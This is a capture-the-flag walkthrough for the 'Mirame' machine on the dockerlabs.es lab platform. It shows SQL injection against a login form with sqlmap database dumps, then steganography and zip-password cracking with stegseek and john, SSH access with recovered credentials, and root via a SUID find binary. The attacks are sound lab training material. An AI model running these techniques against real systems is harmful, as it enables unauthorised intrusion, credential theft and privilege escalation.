                         ━━━━━━━━━━━━━━━━━━━━━
                          MIRAME SQLMAP USAGE

                             dockerlabs.es
                         ━━━━━━━━━━━━━━━━━━━━━


Table of Contents
─────────────────

1. Setup the lab
2. First lookup
..... 1. SQL ERROR ->
3. Access and privilege escalation


1 Setup the lab
═══════════════

  At <https://dockerlabs.es/> has multiple challenges from different
  levels

  • very-easy
  • easy
  • medium
  • hard

  -> Download mirame.zip

  Verify the auto_deploy.sh script content for security good practical
  !!

  ┌────
  │ cat auto_deploy.sh
  └────

  Made the script executable with chmod

  ┌────
  │ chmod +x auto_deploy.sh
  └────

  • Run the script and the machine will be done ->
  <file:./print.png>

  `Máquina desplegada, su dirección IP es ->172.17.0.2'


2 First lookup
══════════════

  First i run nmap enumerate ports and respective services running at
  server

  ┌────
  │ nmap -sVC -Pn -T4 172.17.0.2
  └────

  open ports - 22, 80

  http login page 80

  The login page are vulnerable to SQLInjection, this can be discovery
  after try login with ->

  • username : ’
  • password : 123

  • The single quotation marks are tipically a initial payload to test
    and search for possible sqlinjections


2.0.1 SQL ERROR ->
╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌

  Fatal error: Uncaught mysqli_sql_exception: You have an error in your
  SQL syntax;

  when the server responds an sql syntax error, that mean we are
  manipulating the search at database, the user input is merged with the
  query at database, potential a high vulnerability at environment

  Request ->
  ┌────
  │ POST /auth.php HTTP/1.1
  │ Host: 172.17.0.2
  │ Content-Length: 26
  │ Cache-Control: max-age=0
  │ Accept-Language: en-US,en;q=0.9
  │ Upgrade-Insecure-Requests: 1
  │ User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
  │ Origin: http://172.17.0.2
  │ Content-Type: application/x-www-form-urlencoded
  │ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
  │ Referer: http://172.17.0.2/
  │ Accept-Encoding: gzip, deflate, br
  │ Connection: keep-alive
  │ 
  │ username=%27&password=1233
  └────

  `%27' is the single quotation mark with url encode

  ――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――

  sqlmap -vv -r request.txt –dbs

  sqlmap -vv -r request.txt -D users –tables

  sqlmap -vv -r request.txt -D users -T usuarios –dump


  [BROKEN LINK: file]:<./data.png>

  • One of the users at table ’usuarios’ is named directoriotravieso,
    with means a directory

  <http://172.17.0.2/directoriotravieso/>

  that directory has a image file

  <http://172.17.0.2/directoriotravieso/miramebien.jpg>

  using stegseek at this flie ->

  ┌────
  │ stegseek miramebien.jpg -wl /usr/share/wordlists/kali-wordlists/rockyou.txt
  └────

  [!] Found passphrase: “chocolate” [!] Original filename:
  “ocultito.zip” [!] Extracting to “miramebien.jpg.out”.

  • After move the miramebien.jpg.out to his original file name
    ’ocultito.zip’, we can unzip that file

    ┌────
    │ mv miramebien.jpg ocultito.zip
    │ unzip ocultito.zip
    └────

  • the secret.txt from ocultito.zip has a password, which can be
    cracked with `zip2john'

    ┌────
    │ zip2john ocultito.zip > ocultito.hash
    │ 
    └────

  Copy the generated hash and use the john with some wordlist

  ┌────
  │ john --wordlist=/usr/share/wordlists/rockyou.txt ocultito.hash
  └────
  and get the credentials to SSH access from the secret.txt file, which
  are ziped at ocultito.zip with password to decompress


3 Access and privilege escalation
═════════════════════════════════

  ssh -> carlos:carlitos

  searching for binarys with SUID bit set
  ┌────
  │ find / -type f -perm -4000 -ls 2>/dev/null
  └────

  we find the `find' binary with the bit SUID, what is a big problem for
  security

  we can elevate our priveleges with that binary with SUID bit

  search at <https://gtfobins.github.io/gtfobins/> for ways to exploit
  binarys with SUID bit

  to `find' binary with SUID bit we can do that ->

  ┌────
  │ find . -exec /bin/sh -p \;
  └────

  and now we are the system root !
